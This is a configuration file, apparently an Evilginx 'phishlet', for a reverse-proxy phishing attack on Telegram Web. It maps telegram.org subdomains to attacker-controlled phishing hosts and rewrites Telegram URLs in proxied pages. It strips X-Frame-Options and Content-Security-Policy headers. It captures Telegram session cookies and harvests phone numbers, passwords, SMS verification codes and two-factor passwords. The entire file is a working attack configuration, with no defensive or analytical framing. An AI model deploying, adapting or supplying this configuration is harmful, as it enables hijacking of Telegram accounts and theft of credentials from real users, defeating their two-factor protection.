min_ver: '3.0.0'
author: 'evilginx3'
redirect_url: 'https://web.telegram.org/'

proxy_hosts:
  - {phish_sub: 'web', orig_sub: 'web', domain: 'telegram.org', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'core', orig_sub: 'core', domain: 'telegram.org', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'telegram.org', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'pl', orig_sub: 'pl', domain: 'telegram.org', session: false, is_landing: false, auto_filter: true}

sub_filters:
  # Replace Telegram domain URLs
  - {triggers_on: 'web.telegram.org', orig_sub: 'web', domain: 'telegram.org', search: 'https://web\\.telegram\\.org', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'web.telegram.org', orig_sub: 'core', domain: 'telegram.org', search: 'https://core\\.telegram\\.org', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'web.telegram.org', orig_sub: 'api', domain: 'telegram.org', search: 'https://api\\.telegram\\.org', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'web.telegram.org', orig_sub: 'pl', domain: 'telegram.org', search: 'https://[a-z0-9-]+\\.telegram\\.org', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/javascript']}
  
  # Remove security headers
  - {triggers_on: 'web.telegram.org', orig_sub: 'web', domain: 'telegram.org', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'web.telegram.org', orig_sub: 'web', domain: 'telegram.org', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'web.telegram.org', orig_sub: 'core', domain: 'telegram.org', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'web.telegram.org', orig_sub: 'core', domain: 'telegram.org', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}

auth_tokens:
  # Primary Telegram authentication cookies
  - domain: '.telegram.org'
    keys: ['stel_ssid', 'stel_ph', 'stel_lnpref', 'stel_dt', 'stel_web_auth']
    type: 'cookie'
  
  # Session and security cookies
  - domain: '.telegram.org'
    keys: ['stel_lang', 'stel_theme', 'stel_timezone']
    type: 'cookie'
    optional: true
  
  # API tokens
  - domain: '.telegram.org'
    keys: ['api_id', 'api_hash', 'auth_key']
    type: 'cookie'
    optional: true

credentials:
  username:
    key: 'phone_number'
    search: '(.*)'
    type: 'post'
  
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  
  # Phone number field
  phone:
    key: 'phone_number'
    search: '(.*)'
    type: 'post'
  
  # Verification codes
  sms_code:
    key: 'phone_code'
    search: '(.*)'
    type: 'post'
  
  # 2FA password
  two_factor_password:
    key: 'password'
    search: '(.*)'
    type: 'post'

auth_urls:
  - '^/k/'
  - '^/a/'
  - '^/c/'
  - '^/im'
  - '^/settings'

login:
  domain: 'web.telegram.org'
  path: '/k/'

